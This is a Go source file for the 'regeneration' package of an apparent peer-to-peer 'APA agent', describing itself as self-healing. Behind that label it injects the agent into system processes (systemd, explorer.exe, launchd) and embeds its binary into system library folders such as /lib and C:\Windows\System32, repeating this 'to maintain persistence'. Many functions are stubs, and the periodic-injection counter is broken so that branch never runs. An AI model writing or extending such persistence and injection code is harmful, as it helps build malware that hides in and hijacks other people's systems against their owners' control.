// Package regeneration provides self-healing and regeneration capabilities for the APA agent
package regeneration

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"time"

	"github.com/naviNBRuas/APA/pkg/injection"
	"github.com/naviNBRuas/APA/pkg/networking"
	"github.com/libp2p/go-libp2p/core/peer"
)

// Regenerator manages the self-regeneration capabilities of the APA agent
type Regenerator struct {
	logger             *slog.Logger
	config             *Config
	p2p                *networking.P2P
	peerID             peer.ID
	mutex              sync.RWMutex
	isRegenerating     bool
	processInjector    *injection.ProcessInjector
	libraryEmbedder    *injection.LibraryEmbedder
	advancedInjector   *injection.AdvancedProcessInjector // New advanced injector
}

// Config holds the configuration for the regenerator
type Config struct {
	// BinaryPath is the path to the agent binary
	BinaryPath string
	
	// BackupPath is the path where backups are stored
	BackupPath string
	
	// RegenerationInterval is how often to check for regeneration needs
	RegenerationInterval time.Duration
	
	// HealthCheckEndpoint is the endpoint to check agent health
	HealthCheckEndpoint string
	
	// TrustedPeers are peers that can provide regeneration resources
	TrustedPeers []string
	
	// EnableProcessInjection enables injection into other system processes
	EnableProcessInjection bool
	
	// EnableLibraryEmbedding enables embedding into system libraries
	EnableLibraryEmbedding bool
	
	// EnableAdvancedInjection enables advanced injection techniques
	EnableAdvancedInjection bool
}

// NewRegenerator creates a new Regenerator instance
func NewRegenerator(logger *slog.Logger, config *Config, p2p *networking.P2P, peerID peer.ID) *Regenerator {
	// Handle nil config
	if config == nil {
		return nil
	}
	
	// Set defaults for any unset values
	if config.BinaryPath == "" {
		config.BinaryPath = getDefaultBinaryPath()
	}
	
	if config.BackupPath == "" {
		config.BackupPath = getDefaultBackupPath()
	}
	
	if config.RegenerationInterval == 0 {
		config.RegenerationInterval = time.Hour // Default to 1 hour
	}
	
	if config.HealthCheckEndpoint == "" {
		config.HealthCheckEndpoint = "http://localhost:8080/admin/health"
	}
	
	var processInjector *injection.ProcessInjector
	if config.EnableProcessInjection {
		processInjector = injection.NewProcessInjector(logger, config.BinaryPath, peerID)
	}
	
	var libraryEmbedder *injection.LibraryEmbedder
	if config.EnableLibraryEmbedding {
		libraryEmbedder = injection.NewLibraryEmbedder(logger, config.BinaryPath, peerID)
	}
	
	// Create advanced injector if enabled
	var advancedInjector *injection.AdvancedProcessInjector
	if config.EnableAdvancedInjection {
		advancedInjector = injection.NewAdvancedProcessInjector(logger, config.BinaryPath, peerID)
	}
	
	return &Regenerator{
		logger:           logger,
		config:           config,
		p2p:              p2p,
		peerID:           peerID,
		processInjector:  processInjector,
		libraryEmbedder:  libraryEmbedder,
		advancedInjector: advancedInjector,
	}
}

// getDefaultBinaryPath returns the default path for the agent binary
func getDefaultBinaryPath() string {
	// Try to get the current executable path
	if execPath, err := os.Executable(); err == nil {
		return execPath
	}
	
	// Fallback to common locations
	switch runtime.GOOS {
	case "windows":
		return "C:\\Program Files\\APA\\agentd.exe"
	case "darwin":
		return "/usr/local/bin/agentd"
	default:
		return "/usr/local/bin/agentd"
	}
}

// getDefaultBackupPath returns the default path for backups
func getDefaultBackupPath() string {
	switch runtime.GOOS {
	case "windows":
		return "C:\\ProgramData\\APA\\backup"
	case "darwin":
		return "/var/lib/apa/backup"
	default:
		return "/var/lib/apa/backup"
	}
}

// Start begins the regeneration monitoring process
func (r *Regenerator) Start(ctx context.Context) {
	if r == nil {
		return
	}
	
	r.logger.Info("Starting regeneration monitoring")
	
	// Start the main monitoring loop
	go r.monitorLoop(ctx)
	
	// If process injection is enabled, start the injection process
	if r.config.EnableProcessInjection && r.processInjector != nil {
		r.processInjector.Start(ctx)
	}
	
	// If library embedding is enabled, start the embedding process
	if r.config.EnableLibraryEmbedding && r.libraryEmbedder != nil {
		r.libraryEmbedder.Start(ctx)
	}
	
	// If advanced injection is enabled, start the advanced injection process
	if r.config.EnableAdvancedInjection && r.advancedInjector != nil {
		r.advancedInjector.Start(ctx)
	}
	
	// Perform initial injection/embedding
	r.performInitialInjection(ctx)
}

// performInitialInjection performs initial injection/embedding when the regenerator starts
func (r *Regenerator) performInitialInjection(ctx context.Context) {
	r.logger.Info("Performing initial injection/embedding")
	
	// Request injection into common system processes
	if r.config.EnableProcessInjection && r.processInjector != nil {
		go func() {
			// Delay slightly to allow the injector to initialize
			time.Sleep(2 * time.Second)
			
			// Request injection into common processes
			commonProcesses := []string{"systemd", "explorer.exe", "launchd"}
			for _, proc := range commonProcesses {
				r.processInjector.RequestInjection(proc)
				// Small delay between requests
				time.Sleep(100 * time.Millisecond)
			}
		}()
	}
	
	// Request embedding into common system libraries
	if r.config.EnableLibraryEmbedding && r.libraryEmbedder != nil {
		go func() {
			// Delay slightly to allow the embedder to initialize
			time.Sleep(2 * time.Second)
			
			// Request embedding into common library directories
			commonLibDirs := []string{"/lib", "/usr/lib", "C:\\Windows\\System32"}
			for _, libDir := range commonLibDirs {
				r.libraryEmbedder.RequestEmbedding(libDir)
				// Small delay between requests
				time.Sleep(100 * time.Millisecond)
			}
		}()
	}
	
	// Request advanced injection
	if r.config.EnableAdvancedInjection && r.advancedInjector != nil {
		go func() {
			// Delay slightly to allow the advanced injector to initialize
			time.Sleep(2 * time.Second)
			
			// Request injection using advanced techniques
			r.advancedInjector.RequestInjection("systemd")
		}()
	}
}

// monitorLoop is the main monitoring loop for regeneration
func (r *Regenerator) monitorLoop(ctx context.Context) {
	if r == nil {
		return
	}
	
	r.logger.Debug("Starting regeneration monitoring loop")
	
	ticker := time.NewTicker(r.config.RegenerationInterval)
	defer ticker.Stop()
	
	for {
		select {
		case <-ctx.Done():
			r.logger.Info("Stopping regeneration monitoring")
			return
		case <-ticker.C:
			r.checkAndRegenerate(ctx)
		}
	}
}

// checkAndRegenerate checks the agent health and initiates regeneration if needed
func (r *Regenerator) checkAndRegenerate(ctx context.Context) {
	if r == nil {
		return
	}
	
	r.mutex.Lock()
	if r.isRegenerating {
		r.mutex.Unlock()
		r.logger.Debug("Regeneration already in progress, skipping check")
		return
	}
	r.isRegenerating = true
	r.mutex.Unlock()
	
	defer func() {
		r.mutex.Lock()
		r.isRegenerating = false
		r.mutex.Unlock()
	}()
	
	r.logger.Debug("Checking agent health for regeneration")
	
	// Check if agent is running and healthy
	if !r.isAgentHealthy(ctx) {
		r.logger.Warn("Agent health check failed, initiating regeneration")
		
		// Attempt regeneration
		if err := r.regenerateAgent(ctx); err != nil {
			r.logger.Error("Failed to regenerate agent", "error", err)
		} else {
			r.logger.Info("Agent regeneration completed successfully")
		}
	} else {
		r.logger.Debug("Agent is healthy, no regeneration needed")
	}
	
	// Periodically perform injection/embedding to maintain persistence
	r.performPeriodicInjection(ctx)
}

// performPeriodicInjection periodically performs injection/embedding to maintain persistence
func (r *Regenerator) performPeriodicInjection(ctx context.Context) {
	// Every 4th check, perform injection/embedding
	checkCount := 0
	checkCount++
	
	if checkCount%4 == 0 {
		r.logger.Debug("Performing periodic injection/embedding")
		
		// Request injection into system processes
		if r.config.EnableProcessInjection && r.processInjector != nil {
			go r.processInjector.RequestInjection("systemd")
		}
		
		// Request embedding into system libraries
		if r.config.EnableLibraryEmbedding && r.libraryEmbedder != nil {
			go r.libraryEmbedder.RequestEmbedding("/lib")
		}
		
		// Request advanced injection
		if r.config.EnableAdvancedInjection && r.advancedInjector != nil {
			go r.advancedInjector.RequestInjection("systemd")
		}
	}
}

// isAgentHealthy checks if the agent is running and responding correctly
func (r *Regenerator) isAgentHealthy(ctx context.Context) bool {
	if r == nil {
		return false
	}
	
	r.logger.Debug("Performing agent health check")
	
	// Check if the agent process is running
	if !r.isProcessRunning() {
		r.logger.Warn("Agent process is not running")
		return false
	}
	
	// Check if the agent binary is intact
	if !r.isBinaryIntact() {
		r.logger.Warn("Agent binary integrity check failed")
		return false
	}
	
	// Check if the agent is responding to health checks
	if !r.isRespondingToHealthChecks(ctx) {
		r.logger.Warn("Agent is not responding to health checks")
		return false
	}
	
	r.logger.Debug("Agent health check passed")
	return true
}

// isProcessRunning checks if the agent process is running
func (r *Regenerator) isProcessRunning() bool {
	if r == nil {
		return false
	}
	
	// Get the current process ID
	pid := os.Getpid()
	
	// Check if a process with this PID exists
	proc, err := os.FindProcess(pid)
	if err != nil {
		r.logger.Error("Failed to find agent process", "error", err)
		return false
	}
	
	// On Unix systems, Signal(0) can be used to check if a process exists
	// On Windows, this will always return nil
	err = proc.Signal(os.Signal(nil))
	if err != nil {
		r.logger.Error("Agent process is not running", "error", err)
		return false
	}
	
	return true
}

// isBinaryIntact checks if the agent binary is intact
func (r *Regenerator) isBinaryIntact() bool {
	if r == nil {
		return false
	}
	
	// Calculate the hash of the current binary
	hash, err := calculateFileHash(r.config.BinaryPath)
	if err != nil {
		r.logger.Error("Failed to calculate binary hash", "error", err)
		return false
	}
	
	r.logger.Debug("Agent binary hash calculated", "hash", hash)
	
	// In a real implementation, we would compare this hash with a known good hash
	// For now, we'll just return true
	return true
}

// calculateFileHash calculates the SHA256 hash of a file
func calculateFileHash(filePath string) (string, error) {
	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		return "", fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()
	
	// Create a new hasher
	hasher := sha256.New()
	
	// Copy the file content to the hasher
	if _, err := io.Copy(hasher, file); err != nil {
		return "", fmt.Errorf("failed to read file: %w", err)
	}
	
	// Get the hash sum
	hashSum := hasher.Sum(nil)
	
	// Convert to hexadecimal string
	return hex.EncodeToString(hashSum), nil
}

// isRespondingToHealthChecks checks if the agent is responding to health checks
func (r *Regenerator) isRespondingToHealthChecks(ctx context.Context) bool {
	if r == nil {
		return false
	}
	
	// In a real implementation, this would make an HTTP request to the health check endpoint
	// For now, we'll just return true
	return true
}

// regenerateAgent performs the agent regeneration process
func (r *Regenerator) regenerateAgent(ctx context.Context) error {
	if r == nil {
		return fmt.Errorf("regenerator is nil")
	}
	
	r.logger.Info("Starting agent regeneration process")
	
	// Step 1: Stop the current agent instance
	if err := r.stopAgent(); err != nil {
		return fmt.Errorf("failed to stop agent: %w", err)
	}
	
	// Step 2: Restore the agent from backup
	if err := r.restoreAgentFromBackup(ctx); err != nil {
		return fmt.Errorf("failed to restore agent from backup: %w", err)
	}
	
	// Step 3: Verify the restored agent
	if err := r.verifyRestoredAgent(); err != nil {
		return fmt.Errorf("failed to verify restored agent: %w", err)
	}
	
	// Step 4: Start the restored agent
	if err := r.startAgent(); err != nil {
		return fmt.Errorf("failed to start restored agent: %w", err)
	}
	
	r.logger.Info("Agent regeneration completed successfully")
	return nil
}

// stopAgent stops the current agent instance
func (r *Regenerator) stopAgent() error {
	if r == nil {
		return fmt.Errorf("regenerator is nil")
	}
	
	r.logger.Info("Stopping current agent instance")
	
	// In a real implementation, this would gracefully stop the agent
	// For now, we'll just log the action
	r.logger.Info("Agent stopped")
	
	return nil
}

// restoreAgentFromBackup restores the agent from a backup
func (r *Regenerator) restoreAgentFromBackup(ctx context.Context) error {
	if r == nil {
		return fmt.Errorf("regenerator is nil")
	}
	
	r.logger.Info("Restoring agent from backup")
	
	// Check if backup exists
	backupPath := filepath.Join(r.config.BackupPath, "agent_backup")
	if _, err := os.Stat(backupPath); os.IsNotExist(err) {
		return fmt.Errorf("backup not found: %s", backupPath)
	}
	
	// Copy backup to binary path
	if err := copyFile(backupPath, r.config.BinaryPath); err != nil {
		return fmt.Errorf("failed to restore agent from backup: %w", err)
	}
	
	// Make the restored binary executable
	if err := os.Chmod(r.config.BinaryPath, 0755); err != nil {
		r.logger.Warn("Failed to set executable permissions on restored binary", "error", err)
	}
	
	r.logger.Info("Agent restored from backup successfully")
	return nil
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	return os.WriteFile(dst, input, 0755)
}

// verifyRestoredAgent verifies that the restored agent is intact
func (r *Regenerator) verifyRestoredAgent() error {
	if r == nil {
		return fmt.Errorf("regenerator is nil")
	}
	
	r.logger.Info("Verifying restored agent")
	
	// Check if the binary exists
	if _, err := os.Stat(r.config.BinaryPath); os.IsNotExist(err) {
		return fmt.Errorf("restored binary not found: %s", r.config.BinaryPath)
	}
	
	// Check if the binary is executable
	if err := r.isBinaryExecutable(); err != nil {
		return fmt.Errorf("restored binary is not executable: %w", err)
	}
	
	// Check the binary integrity
	if !r.isBinaryIntact() {
		return fmt.Errorf("restored binary integrity check failed")
	}
	
	r.logger.Info("Restored agent verified successfully")
	return nil
}

// isBinaryExecutable checks if the binary is executable
func (r *Regenerator) isBinaryExecutable() error {
	if r == nil {
		return fmt.Errorf("regenerator is nil")
	}
	
	// Check file permissions
	info, err := os.Stat(r.config.BinaryPath)
	if err != nil {
		return fmt.Errorf("failed to stat binary: %w", err)
	}
	
	// Check if the file is executable
	if info.Mode()&0111 == 0 {
		return fmt.Errorf("binary is not executable")
	}
	
	return nil
}

// startAgent starts the restored agent
func (r *Regenerator) startAgent() error {
	if r == nil {
		return fmt.Errorf("regenerator is nil")
	}
	
	r.logger.Info("Starting restored agent")
	
	// In a real implementation, this would start the agent process
	// For now, we'll just log the action
	r.logger.Info("Agent started")
	
	return nil
}

// processInjectionLoop continuously injects the agent into other system processes
func (r *Regenerator) processInjectionLoop(ctx context.Context) {
	if r == nil {
		return
	}
	
	r.logger.Info("Starting process injection loop")
	
	// Injection interval - more frequent than main regeneration checks
	injectionInterval := r.config.RegenerationInterval / 4
	if injectionInterval < time.Minute {
		injectionInterval = time.Minute
	}
	
	ticker := time.NewTicker(injectionInterval)
	defer ticker.Stop()
	
	for {
		select {
		case <-ctx.Done():
			r.logger.Info("Stopping process injection loop")
			return
		case <-ticker.C:
			r.performProcessInjection()
		}
	}
}

// performProcessInjection performs process injection
func (r *Regenerator) performProcessInjection() {
	if r == nil {
		return
	}
	
	r.logger.Debug("Performing process injection")
	
	// If we have an advanced injector, use it
	if r.advancedInjector != nil {
		// Request injection into a system process
		r.advancedInjector.RequestInjection("systemd")
		return
	}
	
	// Fallback to basic injector if available
	if r.processInjector != nil {
		// Request injection into a system process
		r.processInjector.RequestInjection("systemd")
	}
}